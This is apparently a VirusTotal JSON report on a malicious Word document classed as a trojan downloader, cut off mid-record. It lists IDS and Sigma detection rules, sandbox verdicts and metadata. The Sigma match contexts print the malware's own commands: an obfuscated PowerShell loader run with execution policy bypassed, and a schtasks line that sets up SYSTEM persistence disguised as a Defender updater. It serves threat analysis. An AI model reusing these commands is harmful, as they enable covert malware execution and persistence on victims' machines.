{
    "data":  {
                 "id":  "616b5f143156dffbdc6cd5765d157874540739f7d74a0b86cb0c4ed342605443",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/616b5f143156dffbdc6cd5765d157874540739f7d74a0b86cb0c4ed342605443"
                           },
                 "attributes":  {
                                    "ssdeep":  "49152:Bw03Bj6gSpL3jJW+2Xe3ljtP7XR7vBbtoEK:BwQBjHkLjJW1X8VRFbtY",
                                    "crowdsourced_ids_results":  [
                                                                     {
                                                                         "rule_category":  "Misc activity",
                                                                         "alert_severity":  "low",
                                                                         "rule_msg":  "ET INFO External IP Lookup Domain (ipify .org) in DNS Lookup",
                                                                         "rule_raw":  "alert dns $HOME_NET any -\u003e any any (msg:\"ET INFO External IP Lookup Domain (ipify .org) in DNS Lookup\"; dns.query; dotprefix; content:\".ipify.org\"; nocase; endswith; classtype:misc-activity; sid:2047702; rev:1; metadata:affected_product Any, attack_target Client_and_Server, created_at 2023_08_22, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, tag External_IP_Lookup, updated_at 2023_08_22, reviewed_at 2023_10_06;)",
                                                                         "alert_context":  [
                                                                                               {
                                                                                                   "dest_ip":  "8.8.8.8",
                                                                                                   "dest_port":  53
                                                                                               }
                                                                                           ],
                                                                         "rule_url":  "https://rules.emergingthreats.net/",
                                                                         "rule_source":  "Proofpoint Emerging Threats Open",
                                                                         "rule_id":  "1:2047702"
                                                                     },
                                                                     {
                                                                         "rule_category":  "Misc activity",
                                                                         "alert_severity":  "low",
                                                                         "rule_msg":  "ET INFO External IP Address Lookup Domain (ipify .org) in TLS SNI",
                                                                         "rule_raw":  "alert tls $HOME_NET any -\u003e $EXTERNAL_NET any (msg:\"ET INFO External IP Address Lookup Domain (ipify .org) in TLS SNI\"; flow:established,to_server; tls.sni; dotprefix; content:\".ipify.org\"; endswith; fast_pattern; classtype:misc-activity; sid:2047703; rev:1; metadata:affected_product Any, attack_target Client_and_Server, created_at 2023_08_22, deployment Perimeter, former_category INFO, performance_impact Low, confidence High, signature_severity Informational, tag External_IP_Lookup, updated_at 2023_08_22, reviewed_at 2023_08_22;)",
                                                                         "alert_context":  [
                                                                                               {
                                                                                                   "dest_ip":  "64.185.227.156",
                                                                                                   "ja3":  "54328bd36c14bd82ddaa0c04b25ed9ad",
                                                                                                   "dest_port":  443
                                                                                               }
                                                                                           ],
                                                                         "rule_url":  "https://rules.emergingthreats.net/",
                                                                         "rule_source":  "Proofpoint Emerging Threats Open",
                                                                         "rule_id":  "1:2047703"
                                                                     }
                                                                 ],
                                    "exiftool":  {
                                                     "MIMEType":  "application/msword",
                                                     "LanguageCode":  "English (US)",
                                                     "ModifyDate":  "2018:04:18 11:45:00",
                                                     "SharedDoc":  "No",
                                                     "HyperlinksChanged":  "No",
                                                     "AppVersion":  "15.0",
                                                     "LinksUpToDate":  "No",
                                                     "LastModifiedBy":  "Windows User",
                                                     "HeadingPairs":  "Title, 1",
                                                     "FileType":  "DOC",
                                                     "FileTypeExtension":  "doc",
                                                     "CreateDate":  "2017:12:04 09:14:00",
                                                     "ScaleCrop":  "No",
                                                     "CompObjUserType":  "Microsoft Word 97-2003 Document",
                                                     "Template":  "Normal.dotm",
                                                     "Words":  "65",
                                                     "Author":  "na.gov.pk",
                                                     "TotalEditTime":  "1.5 hours",
                                                     "CodePage":  "Windows Latin 1 (Western European)",
                                                     "Paragraphs":  "1",
                                                     "Lines":  "3",
                                                     "System":  "Windows",
                                                     "CompObjUserTypeLen":  "32",
                                                     "Hyperlinks":  "http://www.pdma.gop.pk/sites/pdma.gop.pk/themes/bootstrap/logo.png",
                                                     "Identification":  "Word 8.0",
                                                     "Word97":  "No",
                                                     "Characters":  "375",
                                                     "CharCountWithSpaces":  "439",
                                                     "LastPrinted":  "0000:00:00 00:00:00",
                                                     "Security":  "None",
                                                     "DocFlags":  "Has picture, 1Table, ExtChar",
                                                     "Pages":  "1",
                                                     "RevisionNumber":  "50",
                                                     "Software":  "Microsoft Office Word"
                                                 },
                                    "type_extension":  "doc",
                                    "filecondis":  {
                                                       "raw_md5":  "d6686fcd5cc258f5c5dfeeb27888797a",
                                                       "dhash":  "0000101e1e070600"
                                                   },
                                    "sigma_analysis_stats":  {
                                                                 "high":  5,
                                                                 "medium":  10,
                                                                 "critical":  1,
                                                                 "low":  4
                                                             },
                                    "tlsh":  "T13AB55A11FDD81E0EF8CD847670AECAC6E5F92E07D6D1B092278B33A5142BE2E161E5C5",
                                    "last_modification_date":  1766543176,
                                    "size":  2322944,
                                    "creation_date":  1512378840,
                                    "popular_threat_classification":  {
                                                                          "suggested_threat_label":  "trojan.w97m/jeki",
                                                                          "popular_threat_name":  [
                                                                                                      {
                                                                                                          "value":  "w97m",
                                                                                                          "count":  10
                                                                                                      },
                                                                                                      {
                                                                                                          "value":  "jeki",
                                                                                                          "count":  7
                                                                                                      },
                                                                                                      {
                                                                                                          "value":  "donoff",
                                                                                                          "count":  3
                                                                                                      }
                                                                                                  ],
                                                                          "popular_threat_category":  [
                                                                                                          {
                                                                                                              "value":  "trojan",
                                                                                                              "count":  20
                                                                                                          },
                                                                                                          {
                                                                                                              "value":  "downloader",
                                                                                                              "count":  11
                                                                                                          }
                                                                                                      ]
                                                                      },
                                    "trid":  [
                                                 {
                                                     "file_type":  "Microsoft Word document",
                                                     "probability":  52.6
                                                 },
                                                 {
                                                     "file_type":  "Microsoft Word document (old ver.)",
                                                     "probability":  33.3
                                                 },
                                                 {
                                                     "file_type":  "Generic OLE2 / Multistream Compound",
                                                     "probability":  14.0
                                                 }
                                             ],
                                    "sandbox_verdicts":  {
                                                             "Zenbox":  {
                                                                            "category":  "malicious",
                                                                            "confidence":  100,
                                                                            "sandbox_name":  "Zenbox",
                                                                            "malware_classification":  [
                                                                                                           "MALWARE",
                                                                                                           "EVADER"
                                                                                                       ]
                                                                        },
                                                             "DOCGuard":  {
                                                                              "category":  "malicious",
                                                                              "sandbox_name":  "DOCGuard",
                                                                              "malware_classification":  [
                                                                                                             "MALWARE"
                                                                                                         ]
                                                                          }
                                                         },
                                    "magic":  "Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: na.gov.pk, Template: Normal.dotm, Last Saved By: Windows User, Revision Number: 50, Name of Creating Application: Microsoft Office Word, Total Editing Time: 01:32:00, Create Time/Date: Mon Dec  4 09:14:00 2017, Last Saved Time/Date: Wed Apr 18 11:45:00 2018, Number of Pages: 1, Number of Words: 65, Number of Characters: 375, Security: 0",
                                    "main_icon":  {
                                                      "raw_md5":  "802797a642b2e2cc7db6878ca0b7880e",
                                                      "dhash":  "1939455543517161"
                                                  },
                                    "sha1":  "7b24d7332f22c4d9ac72070203745b4bea208cb4",
                                    "autostart_locations":  [
                                                                {
                                                                    "entry":  "cmd.exe"
                                                                },
                                                                {
                                                                    "entry":  "HKLM\\System\\CurrentControlSet\\Services\\21cfg2qgy",
                                                                    "location":  "HKLM\\System\\CurrentControlSet\\Services"
                                                                },
                                                                {
                                                                    "entry":  "HKLM\\System\\CurrentControlSet\\Services\\fmrapk1g2",
                                                                    "location":  "HKLM\\System\\CurrentControlSet\\Services"
                                                                }
                                                            ],
                                    "reputation":  -1,
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F94-6565-5A06-000000004800}; ProcessId=5864; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F52-6565-5506-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1848; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126036; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9B-6565-5B06-000000004800}; ProcessId=3488; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F5A-6565-5806-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2052; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126043; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "critical",
                                                                       "rule_id":  "02b55b29ddf740930b68c311ca7cd59354f8c35ceda86d09a3fb06f08b760857",
                                                                       "rule_source":  "Joe Security Rule Set (GitHub)",
                                                                       "rule_title":  "Schedule system process",
                                                                       "rule_description":  "Schedule system process",
                                                                       "rule_author":  "Joe Security"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F52-6565-5506-000000004800}; ProcessId=1848; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125970; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F5A-6565-5806-000000004800}; ProcessId=2052; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701125978; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9E-6565-5D06-000000004800}; ProcessId=7116; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126046; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1FA6-6565-6006-000000004800}; ProcessId=1952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3008-6538-5400-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4064; CurrentDirectory=c:\\; CommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%%3) -eq 0){while($v -ne 0){$vv=$v%%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding; UtcTime=1701126054; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "1929e853315b3b5398e0837b2b8928a28ae8eec0611ebb41efc5e6b33e78cd6c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Parameter Substring",
                                                                       "rule_description":  "Detects suspicious PowerShell invocation with a parameter substring",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F94-6565-5A06-000000004800}; ProcessId=5864; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F52-6565-5506-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1848; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126036; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9B-6565-5B06-000000004800}; ProcessId=3488; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F5A-6565-5806-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2052; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126043; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2105a0eff0c693326dcb33bbdcfd768fd6c8825061ae9eb48d31703fabf241e5",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potentially Suspicious PowerShell Child Processes",
                                                                       "rule_description":  "Detects potentially suspicious child processes spawned by PowerShell",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Tim Shelton"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=5996; TargetFilename=C:\\ProgramData\\EventManager.dll; RuleName=DLL; CreationUtcTime=1701125957; UtcTime=1701125957; ProcessGuid={C784477D-1F3F-6565-4F06-000000004800}; Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "5c100e376f43b26c0279b6ecab437d35499a64f73cd9c1b180f62e840eebd2a6",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "File With Uncommon Extension Created By An Office Application",
                                                                       "rule_description":  "Detects the creation of files with an executable or script extension by an Office application.",
                                                                       "rule_author":  "Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F94-6565-5A06-000000004800}; ProcessId=5864; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F52-6565-5506-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1848; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126036; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F9B-6565-5B06-000000004800}; ProcessId=3488; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F5A-6565-5806-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2052; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126043; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "80bbf1ed6106205ab2926430c9634286f976b2fee4357dbacddec45b979a4422",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Windows Shell/Scripting Processes Spawning Suspicious Programs",
                                                                       "rule_description":  "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Tim Shelton"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-1F94-6565-5A06-000000004800}; ProcessId=5864; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-1F52-6565-5506-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=1848; CurrentDirectory=C:\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsDefenderUpdater /TR \"c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\" /F; EventID=1; LogonGuid=C784477D-3008-6538-2798-030000000000; LogonId=235559; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u0027\u0027,$d));; UtcTime=1701126036; RuleName=-}"
                                                                                             },
                                                                                             {
